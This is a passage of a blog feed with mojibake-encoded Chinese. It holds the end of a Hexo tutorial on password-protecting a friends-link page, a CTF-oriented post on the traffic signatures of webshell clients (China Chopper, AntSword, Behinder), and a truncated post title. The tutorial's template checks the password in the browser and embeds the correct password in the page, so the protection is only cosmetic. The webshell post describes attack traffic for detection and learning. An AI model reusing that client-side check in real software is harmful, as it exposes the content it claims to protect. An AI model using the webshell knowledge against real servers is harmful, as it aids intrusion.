&#x27;anzhiyu-flink-list&#x27;)</span><br><span class="line">              if i.link_list</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  - let color = item.color || &quot;&quot;</span><br><span class="line">                  - let tag = item.tag || &quot;&quot;</span><br><span class="line">                  </span><br><span class="line">                  .flink-list-item</span><br><span class="line">                    if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.vip #[=tag]</span><br><span class="line">                        i.light</span><br><span class="line">                    else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.speed #[=tag]</span><br><span class="line">                    else if tag</span><br><span class="line">                      span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                    else if item.recommend</span><br><span class="line">                      span.site-card-tag è</span><br><span class="line">                    if i.lost_contact</span><br><span class="line">                      a.cf-friends-link(href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                        if theme.lazyload.enable</span><br><span class="line">                          img.no-lightbox(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        else</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        .flink-item-info</span><br><span class="line">                          .flink-item-name.cf-friends-name-lost-contact= item.name</span><br><span class="line">                    else</span><br><span class="line">                      a.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                        if theme.lazyload.enable</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(data-lazy-src=url_for(item.avatar), cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        else</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        .flink-item-info</span><br><span class="line">                          .flink-item-name.cf-friends-name= item.name</span><br><span class="line">                          .flink-item-desc(title=item.descr)= item.descr</span><br><span class="line">          </span><br><span class="line">          else if i.flink_style === &#x27;telescopic&#x27;</span><br><span class="line">            .telescopic-site-card-group</span><br><span class="line">              each item in i.link_list</span><br><span class="line">                - let color = item.color || &quot;&quot;</span><br><span class="line">                - let tag = item.tag || &quot;&quot;</span><br><span class="line">                - let siteshot = item.siteshot || `https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/$&#123;item.link&#125;` || theme.default_img</span><br><span class="line">                .site-card</span><br><span class="line">                  if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                    span.site-card-tag.vip #[=tag]</span><br><span class="line">                      i.light</span><br><span class="line">                  else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                    span.site-card-tag.speed #[=tag]</span><br><span class="line">                  else if tag</span><br><span class="line">                    span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                  else if item.recommend</span><br><span class="line">                    span.site-card-tag è</span><br><span class="line">                  a.img.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                    img.flink-avatar(data-lazy-src=siteshot, onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, style=&quot;pointer-events: none;&quot;, src=`$&#123;siteshot&#125;`)</span><br><span class="line">                  a.info.cf-friends-link.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, cf-href=url_for(item.link), rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                    .site-card-avatar</span><br><span class="line">                      img.flink-avatar.cf-friends-avatar.no-fancybox(data-lazy-src=item.avatar, cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, src=item.avatar)</span><br><span class="line">                    .site-card-text</span><br><span class="line">                      span.title.cf-friends-name #[=item.name]</span><br><span class="line">                      span.desc(title=`$&#123;item.descr&#125;`) #[=item.descr]</span><br><span class="line">          else if i.flink_style === &#x27;flexcard&#x27;</span><br><span class="line">            .flexcard-flink-list</span><br><span class="line">              each item in i.link_list</span><br><span class="line">                a.flink-list-card.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) target=&#x27;_blank&#x27; data-title=item.descr)</span><br><span class="line">                  .wrapper.cover</span><br><span class="line">                    - var siteshot = item.siteshot ? url_for(item.siteshot) : &#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27; + item.link</span><br><span class="line">                    if theme.lazyload.enable</span><br><span class="line">                      img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    else</span><br><span class="line">                      img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )    </span><br><span class="line">                  .info</span><br><span class="line">                    if theme.lazyload.enable</span><br><span class="line">                      img.cf-friends-avatar.no-lightbox.flink-avatar(data-lazy-src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    else</span><br><span class="line">                      img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    span.flink-sitename.cf-friends-name= item.name</span><br><span class="line">    != page.content</span><br><span class="line"></span><br><span class="line">if page.password</span><br><span class="line">  script.</span><br><span class="line">    function decryptFriends() &#123;</span><br><span class="line">      const inputPass = document.getElementById(&#x27;hbePass&#x27;).value;</span><br><span class="line">      const correctPass = &#x27;#&#123;page.password&#125;&#x27;;</span><br><span class="line">      const encryptedContent = document.getElementById(&#x27;encrypted-content&#x27;);</span><br><span class="line">      const errorElement = document.getElementById(&#x27;hbeError&#x27;);</span><br><span class="line">      const encryptContainer = document.getElementById(&#x27;hexo-blog-encrypt&#x27;);</span><br><span class="line">      </span><br><span class="line">      if (inputPass === correctPass) &#123;</span><br><span class="line">        encryptedContent.style.display = &#x27;block&#x27;;</span><br><span class="line">        encryptContainer.style.display = &#x27;none&#x27;;</span><br><span class="line">        errorElement.style.display = &#x27;none&#x27;;</span><br><span class="line">        localStorage.setItem(&#x27;friends-page-pass&#x27;, inputPass);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        errorElement.style.display = &#x27;block&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123;</span><br><span class="line">      const savedPass = localStorage.getItem(&#x27;friends-page-pass&#x27;);</span><br><span class="line">      if (savedPass === &#x27;#&#123;page.password&#125;&#x27;) &#123;</span><br><span class="line">        document.getElementById(&#x27;encrypted-content&#x27;).style.display = &#x27;block&#x27;;</span><br><span class="line">        document.getElementById(&#x27;hexo-blog-encrypt&#x27;).style.display = &#x27;none&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><ol><li>åœ¨ä½ åˆ›å»ºå‹é“¾é¡µé¢è€Œç”Ÿæˆçš„<code>\source\link\index.md</code>æ–‡ä»¶çš„Front-matteréƒ¨åˆ†ï¼Œæ·»åŠ ä»¥ä¸‹å‚æ•°ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password: your_password # è®¾ç½®ä½ çš„è®¿é—®å¯†ç </span><br><span class="line">message: è¯·è¾“å…¥å¯†ç æŸ¥çœ‹å‹é“¾</span><br><span class="line">wrong_pass_message: å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ï¼</span><br><span class="line">abstract: è¿™é‡Œæ˜¯åŠ å¯†çš„å‹é“¾é¡µé¢ï¼Œåªæœ‰çŸ¥é“å¯†ç çš„æœ‹å‹æ‰èƒ½çœ‹åˆ°å“¦~</span><br></pre></td></tr></table></figure><ol><li>åˆ›å»ºCSSæ ·å¼å¹¶å¼•å…¥é…ç½®æ–‡ä»¶è¿›è¡Œç¾åŒ–ï¼š</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* åŠ å¯†ç•Œé¢æ ·å¼ */</span></span><br><span class="line"><span class="selector-id">#hexo-blog-encrypt</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-card-bg);</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">3rem</span> <span class="number">2rem</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2rem</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-border);</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hbe-input-container</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hbePass</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-background);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-fontcolor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hexo-blog-encrypt</span> <span class="selector-tag">button</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-theme);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--anzhiyu-white);</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hexo-blog-encrypt</span> <span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--anzhiyu-theme);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">2px</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--anzhiyu-shadow-theme);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæˆåè¿›è¡Œhexo ä¸‰è¿å³å¯åº”ç”¨</p><blockquote><p>é™„ï¼š è¯¥åŠŸèƒ½åˆæ­¥å®ç°ï¼Œå¦‚æœ‰éšè—bugæˆ–å®‰å…¨æ¼æ´è¯·è”ç³»ï¼Œæ„Ÿæ¿€ä¸å°½</p><p>æ³¨ï¼š æœ¬åŠŸèƒ½ä¸æ–‡ç« åŠ å¯†æ’ä»¶ä¸å…¼å®¹</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webshellæµé‡æ·±å…¥ç†è§£</title>
      <link href="/2025/11/02/webshell%E6%B5%81%E9%87%8F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
      <url>/2025/11/02/webshell%E6%B5%81%E9%87%8F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Webshellæµé‡æ·±å…¥ç†è§£"><a href="#Webshellæµé‡æ·±å…¥ç†è§£" class="headerlink" title="Webshellæµé‡æ·±å…¥ç†è§£"></a>Webshellæµé‡æ·±å…¥ç†è§£</h1><p><strong>Webshellæµé‡</strong>ï¼ŒæŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨å·²ç»è·å–ä¸€ä¸ªWebæœåŠ¡å™¨çš„éƒ¨åˆ†æƒé™åï¼Œé€šè¿‡ä¸Šä¼ çš„<strong>Webshellåé—¨è„šæœ¬</strong>ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’æ—¶ï¼Œæ‰€äº§ç”Ÿçš„ç½‘ç»œé€šä¿¡æ•°æ®ã€‚</p><p>é¦–å…ˆï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´ï¼ˆå¦‚æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ç­‰ï¼‰å°†ä¸€ä¸ªWebshellè„šæœ¬æ–‡ä»¶ï¼ˆå¦‚ <code>shell.php</code>ã€<code>backdoor.jsp</code>ï¼‰æ”¾åˆ°äº†ç½‘ç«™çš„ç›®å½•ä¸‹ã€‚è¿™ä¸ªWebshellè„šæœ¬å°±æ˜¯ä¸€ä¸ªé©»ç•™åœ¨æœåŠ¡å™¨ä¸Šçš„<strong>åé—¨</strong>ã€‚</p><p>æ”»å‡»è€…é€šè¿‡å®¢æˆ·ç«¯ï¼ˆä¸“ç”¨è¿æ¥å·¥å…·ï¼‰å‘è¿™ä¸ªWebshellè„šæœ¬å‘é€å‘½ä»¤ï¼ŒæœåŠ¡å™¨å°±å¯ä»¥æ‰§è¡Œæ”»å‡»è€…æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>ç®€å•æ¥è¯´ï¼š</p><p><code>Webshellæµé‡ = æ”»å‡»è€…é€šè¿‡Webåé—¨ï¼ˆWebshellï¼‰è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨æ—¶ï¼Œäº§ç”Ÿçš„â€œæŒ‡ä»¤â€å’Œâ€œç»“æœâ€æ•°æ®æµã€‚</code></p><p>é€šè¿‡åˆ†æwebshellæµé‡ï¼Œå¯ä»¥çŸ¥é“æ”»å‡»è€…çš„æ„å›¾å’Œæ”»å‡»æ‰‹æ³•</p><p>ä¸€èˆ¬CTFä¸­ï¼Œå¸¸æ¶‰åŠçš„æµé‡æœ‰ï¼š ä¸­å›½èœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰ï¼ŒCobalStrikeï¼ˆCSæµé‡ï¼‰ç­‰ã€‚</p><h2 id="èœåˆ€æµé‡"><a href="#èœåˆ€æµé‡" class="headerlink" title="èœåˆ€æµé‡"></a>èœåˆ€æµé‡</h2><p>èœåˆ€æµé‡çš„ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾å°±æ˜¯ï¼Œå“åº”é‡Œå¯èƒ½æœ‰ <code>-&gt;| |&lt;-</code> è¿™æ ·çš„å­—ç¬¦ä¸²</p><p>ä»¥buuctf:èœåˆ€666é¢˜ç›®ä¸ºä¾‹ï¼š</p><p>æ‰“å¼€æµé‡åŒ…è¿½è¸ªæµï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511021340406.png" alt="image-20251102134054182"></p><p>å¯ä»¥å‘ç°ï¼Œ<strong>åœ¨è¯·æ±‚å†…å®¹é‡Œï¼Œä¸»è¦åˆ©ç”¨çš„æ˜¯evalå‡½æ•°/assertå‡½æ•°ï¼Œæ‰€æœ‰å‚æ•°éƒ½ç»è¿‡<code>base64ç¼–ç </code>ï¼Œä½¿ç”¨base64_decodeå‡½æ•°ã€‚è€Œå“åº”å†…å®¹æ˜¯å¸¦ <code>-&gt;| |&lt;-</code>åˆ†éš”ç¬¦çš„</strong></p><p>å…¶æ¬¡ï¼Œå¦‚æœå¤šçœ‹å‡ ä¸ªæµé‡ï¼Œè¿˜ä¼šå‘ç°å‚æ•°åä¸Šä¹Ÿæœ‰ä¸€äº›ç‰¹å¾ï¼šå‚æ•°åé€šå¸¸æ˜¯å‘½åä¸ºz1ã€z2ã€z3â€¦â€¦é€šå¸¸ z0ç”¨äºè®¾ç½®ç¯å¢ƒå˜é‡ã€z1ä¸ºå¯†ç ã€z2ä¸ºæ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>è¿™äº›å°±æ˜¯èœåˆ€æµé‡çš„ç‰¹å¾äº†ï¼Œç”±äºåªæ˜¯base64ç¼–ç å†…å®¹æˆ–ç›´æ¥å‘ˆç°æ˜æ–‡ï¼Œå› æ­¤æµé‡åˆ†æè¿‡ç¨‹ç®€å•ã€‚</p><p>ä»¥ä¸Šé¢˜ä¸ºä¾‹ï¼Œè¿½è¸ªæµå¾ˆå®¹æ˜“å‘ç°ä¼ è¾“çš„æ–‡ä»¶ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511021538560.png" alt="image-20251102153817421"></p><p>æå–å‡ºå›¾ç‰‡åå¾—åˆ°keyï¼Œå†è§£å¯†foremostæå–å‡ºçš„å‹ç¼©åŒ…ï¼Œå³å¯å¾—åˆ°flag</p><h2 id="èšå‰‘æµé‡"><a href="#èšå‰‘æµé‡" class="headerlink" title="èšå‰‘æµé‡"></a>èšå‰‘æµé‡</h2><p>è¿˜æ˜¯å…ˆä»‹ç»ä¸€ä¸‹ç‰¹å¾ï¼Œä»¥ä¾¿æˆ‘ä»¬å¦‚ä½•å¾—çŸ¥è¿™æ˜¯ä¸€ä¸ªèšå‰‘æµé‡ï¼š</p><p>ç›¸æ¯”èœåˆ€ä½¿ç”¨æ˜æ–‡/å¼±ç¼–ç ï¼ˆBase64ï¼‰ï¼Œä½¿ç”¨å›ºå®šåˆ†éš”ç¬¦|&lt;-ï¼Œææ˜“è¢«wafæ‹¦æˆªï¼Œèšå‰‘ä¸»è¦æ”¹è¿›çš„åŠŸèƒ½æ˜¯ç¼–ç è§£ç å™¨ã€‚</p><p>èšå‰‘çš„é»˜è®¤ç¼–ç /è§£ç å™¨ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031639903.png" alt="image-20251103163938735"></p><h3 id="ä¸€-default"><a href="#ä¸€-default" class="headerlink" title="ä¸€. default"></a>ä¸€. default</h3><p>é€‰æ‹©ç¼–/è§£ç å™¨é€‰ç€defaultæ—¶ï¼Œä¸å¯¹ä¼ è¾“çš„Payloadè¿›è¡Œä»»ä½•æ“ä½œã€‚</p><p>è¿™é‡Œæˆ‘æ­å»ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¶åœºï¼Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬å¹¶æŠ“å–èšå‰‘çš„è¿æ¥æµé‡ï¼š</p><p>å› ä¸ºèšå‰‘æ˜¯http åè®®postè¯·æ±‚ï¼Œå¯¹httpæ•°æ®æµè¿›è¡Œè¿½è¸ªï¼Œå¯ä»¥æ‰¾åˆ°æ•°æ®äº¤äº’çš„è¿‡ç¨‹ã€‚</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031720744.png" alt="image-20251103172001510"></p><p>å¯ä»¥å‘ç°payloadåªè¿›è¡Œäº†URLç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨å·¥å…·è½»æ¾è§£ç ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031721197.png" alt="image-20251103172142040"></p><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿçœ‹åˆ°äº†ä¸€äº›ç‰¹å¾ï¼š</p><ol><li><strong>èšå‰‘å¸¦äº†æ˜æ˜¾çš„ç‰¹å¾å‡½æ•°@ini_set()ï¼›</strong></li><li><strong>åœ¨å“åº”çš„å›æ˜¾ç»“æœä¸­ï¼Œå‘ç°å‰åå„æœ‰ä¸€ä¸²éšæœºå­—ç¬¦ä¸²</strong>ï¼ˆè¿™æ˜¯èšå‰‘ä¸ºäº†å¯¹æŠ—å®‰å…¨æ£€æµ‹è€Œè®¾è®¡çš„æ··æ·†æ‰‹æ®µï¼‰</li></ol><h3 id="äºŒ-base64ç¼–ç å™¨"><a href="#äºŒ-base64ç¼–ç å™¨" class="headerlink" title="äºŒ. base64ç¼–ç å™¨"></a>äºŒ. base64ç¼–ç å™¨</h3><p>è¯·æ±‚å“åº”æµé‡å¦‚ä¸‹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031736521.png" alt="image-20251103173652384"></p><p>å¯ä»¥å‘ç°ï¼Œå½“é€‰æ‹©ç¼–/è§£ç å™¨é€‰ç€base64æ—¶ï¼Œ<strong>èšå‰‘ä¼šå°†payloadç»è¿‡base64ç¼–ç å†ç»è¿‡URLç¼–ç åèµ‹å€¼ç»™ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²</strong>ã€‚</p><p>ç„¶åå°†è¿™ä¸ªéšæœºå­—ç¬¦ä¸²çš„å€¼é€šè¿‡POSTæ–¹æ³•ä¼ å…¥evalå‡½æ•°å†base64è§£ç ï¼Œé€šè¿‡evalå‡½æ•°æ‰§è¡Œã€‚</p><p>å…¶ä½™çš„ç‰¹å¾ä¸å˜ï¼ŒåŒ…æ‹¬å“åº”å€¼ä¸­ä¾æ—§å‰åä¼šæœ‰éšæœºçš„å­—ç¬¦ä¸²ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031740818.png" alt="image-20251103174039711"></p><h3 id="ä¸‰-chrç¼–ç å™¨"><a href="#ä¸‰-chrç¼–ç å™¨" class="headerlink" title="ä¸‰. chrç¼–ç å™¨"></a>ä¸‰. chrç¼–ç å™¨</h3><p>è¯·æ±‚å“åº”æµé‡å¦‚ä¸‹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511031743370.png" alt="image-20251103174357217"></p><p>å¯ä»¥å‘ç°ï¼Œå½“ç¼–ç å™¨é€‰æ‹©chrçš„æ—¶å€™ï¼Œèšå‰‘ä¼šå¯¹payloadçš„æ‰€æœ‰å­—ç¬¦éƒ½åˆ©ç”¨åˆ©ç”¨chrå‡½æ•°è¿›è¡Œè½¬æ¢ï¼Œå…¶ä½™çš„ç‰¹å¾å‡ç›¸åŒ</p><h3 id="å››-å…¶å®ƒ"><a href="#å››-å…¶å®ƒ" class="headerlink" title="å››. å…¶å®ƒ"></a>å››. å…¶å®ƒ</h3><ul><li>chr16ç¼–ç å™¨ï¼šå¯¹payloadçš„æ‰€æœ‰å­—ç¬¦éƒ½åˆ©ç”¨chrå‡½æ•°è½¬æ¢ï¼Œä½†æ˜¯å¯¹chrå‡½æ•°ä¼ é€’çš„å‚æ•°æ˜¯åå…­è¿›åˆ¶ã€‚</li><li>rot13ç¼–ç å™¨ï¼šå¯¹payloadä¸­çš„å­—æ¯è¿›è¡Œrot13è½¬æ¢ã€‚</li><li>rspphpç¼–ç å™¨ï¼šéœ€è¦é…ç½®ç”ŸæˆRSAç”Ÿæˆå…¬é’¥ã€ç§é’¥</li></ul><h2 id="å†°èæµé‡"><a href="#å†°èæµé‡" class="headerlink" title="å†°èæµé‡"></a>å†°èæµé‡</h2><p>å†°èæ˜¯ä¸€æ¬¾åŸºäºJavaå¼€å‘çš„åŠ¨æ€åŠ å¯†é€šä¿¡æµé‡çš„æ–°å‹Webshellå®¢æˆ·ç«¯ï¼Œå†°èå½“ä¸­ shell æ˜¯é€šè¿‡ä¼ è¾“åè®®é…ç½®çš„</p><p>å¯ä»¥çœ‹åˆ°æœ‰ä»¥ä¸‹åè®®ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511051242435.png" alt="image-20251105124214340"></p><p>å†°è 4.0 é€šä¿¡æµç¨‹å¦‚ä¸‹ï¼š</p><p><strong>å¯†é’¥åå•†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ”»å‡»è€…é¦–å…ˆé€šè¿‡GETæˆ–è€…POSTä¼ å‚çš„æ–¹æ³•å¯¹æœåŠ¡å™¨è¯·æ±‚å¯†é’¥,è­¬å¦‚ï¼šhttp://127.0.0.1/webshell.aspx?password=6</span><br><span class="line"></span><br><span class="line">2ã€æœåŠ¡å™¨ä½¿ç”¨ç”Ÿæˆçš„éšæœºæ•°çš„MD5å€¼çš„å‰åå…­ä½å½“ä½œå¯†é’¥Kå¹¶ä¸”å­˜å‚¨åœ¨å…¨å±€å˜é‡$_SESSIONä¸­ï¼Œå¹¶ä¸”å‘ç»™æ”»å‡»è€…</span><br></pre></td></tr></table></figure><p><strong>åŠ å¯†ä¼ è¾“</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ”»å‡»è€…å¾—åˆ°äº†å¯†é’¥Kï¼Œå°†Kä½œä¸ºå¯†é’¥è¿›è¡ŒAES128æˆ–è€…å¼‚æˆ–åŠ å¯†åŠ å¯†æ‰‹æ³•å°†æ‰§è¡Œå‘½ä»¤å‘é€åˆ°æœåŠ¡æ®µ</span><br><span class="line"></span><br><span class="line">2ã€æœåŠ¡ç«¯å¾—åˆ°å¯†æ–‡ä¹‹åä½¿ç”¨Kè¿›è¡Œè§£å¯†</span><br><span class="line"></span><br><span class="line">3ã€å°†å¾—åˆ°çš„æ‰§è¡Œç»“æœä½¿ç”¨Kè¿›è¡ŒAESåŠ å¯†ä¹‹åä¼ å›æ”»å‡»è€…</span><br></pre></td></tr></table></figure><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511101331541.png" alt="image-20251110133125398"></p><p>å¾…æ›´æ–°ingâ€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ·±å…¥ç†è§£zipä¼ªåŠ å¯†</title>
      <link href="/2025/10/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2025/10/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
